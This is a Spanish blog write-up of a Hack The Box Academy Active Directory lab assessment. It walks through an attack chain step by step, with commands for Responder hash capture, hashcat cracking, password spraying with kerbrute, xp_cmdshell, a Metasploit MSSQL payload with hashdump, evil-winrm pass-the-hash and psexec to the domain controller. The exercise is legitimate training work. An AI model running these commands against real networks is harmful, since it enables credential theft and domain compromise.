---
layout: single
title: HTB Academy Active Directory Skills Assessment Part II
date: 2024-12-03
classes: wide
categories:
  - writeups
tags:
  - HTB
  - writeup
  - pentesting
---

Este write-up trata del último ejercicio para el módulo de Active Directory de Hack The Box Academy. Nos dan acceso a una máquina Parrot que comparte enrutador con el entorno a vulnerar.

Vamos a analizar el entorno:

```
nmap -T4 -A 172.16.6.0/23 -oN nmap_scan.txt &
responder -I ens24&
```

Encontramos:

- Domain Controller (DC) with IP address: 172.16.7.3
    
- MS01 host with IP address: 172.16.7.50
    
- SQL01 server with IP address: 172.16.7.60

También, gracias al Responder, obtenemos un hash NTLMv2 de un usuario para MS01. 

```
hashcat -m 5600 hash_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

Con estas credenciales, vamos a rastrear usuarios válidos con el servicio smb levantado en MS01.

```shell
crackmapexec smb 172.16.7.50 -u '' -p '' --users
```

Encontramos varios usuarios válidos, los introducimos en un .txt y con un diccionario de las 1000 contraseñas más comunes, hacemos un password spray attack: 

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users_valid.txt password.txt
```

Con las credenciales obtenidas ahora, tenemos acceso de lectura a los directorios compartidos. Hay más credenciales en: 

```shell
smbmap -u '' -p '' -R Department Shares -H 172.16.7.3 -A web.config -q
```

Esta nueva cuenta tiene activado el privilegio 'SeImpersonatePrivilege'.

```shell
mssqlclient.py INLANEFREIGHT/user@172.16.7.60
xp_cmdshell "whoami /priv"
```

La forma más rápida de explotar esta vulnerabilidad y acceder a SQL01 es con metasploit.

```shell
msfconsole -q
search mssql_payload
use 0
(...)
exploit
```

Si a este exploit le añadimos el meterpreter como payload, podremos realizar un hashdump que nos dará acceso a credenciales para MS01.

```shell
evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbf (...)
```

Una vez en MS01, podemos utilizar Inveigh.exe, que tiene la misma función que Responder pero para Windows. 

```Powershell
Evil-WinRM* PS C:\Users\Administrator\Desktop> upload Inveigh.exe
Info: Uploading Inveigh.exe to C:\Users\Administrator\Desktop\Inveigh.exe
```

Esto nos devolverá otro hash NTLMv2. Una vez pasado por hashcat, sólo será necesario utilizar `psexec.py` para acceder a DC01. 



